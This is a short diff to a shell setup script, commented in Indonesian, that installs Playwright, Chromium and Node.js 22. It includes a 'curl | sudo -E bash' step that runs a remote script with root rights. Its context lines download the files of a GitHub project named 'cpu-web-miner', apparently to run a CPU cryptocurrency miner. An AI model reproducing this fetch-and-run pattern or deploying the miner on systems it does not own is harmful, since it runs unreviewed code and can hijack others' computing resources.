@@ -30,7 +30,19 @@ pip install playwright
 
 echo "[*] Install Chromium browser for Playwright..."
 playwright install chromium
-npm install -g npm@11.6.1
+
+# Hapus Node.js lama
+sudo apt-get remove -y nodejs npm
+
+# Tambahkan repo Node.js versi terbaru LTS (22.x)
+curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
+
+# Install Node.js + npm
+sudo apt-get install -y nodejs
+
+# Update npm ke versi terbaru
+sudo npm install -g npm
+
 wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/index.js
 wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package-lock.json
 wget -q https://github.com/MarcoCiaramella/cpu-web-miner/raw/refs/heads/main/package.json
